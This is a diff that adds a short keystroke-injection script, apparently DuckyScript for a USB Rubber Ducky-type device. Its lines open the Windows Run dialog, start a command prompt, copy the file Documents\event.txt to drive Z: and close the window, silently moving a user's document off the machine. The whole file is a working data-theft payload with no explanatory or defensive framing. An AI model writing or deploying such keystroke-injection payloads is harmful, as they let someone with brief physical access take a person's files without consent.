@@ -1,0 +1,9 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1350
+STRING copy Documents\event.txt Z:\
+DELAY 1000
+STRING exit
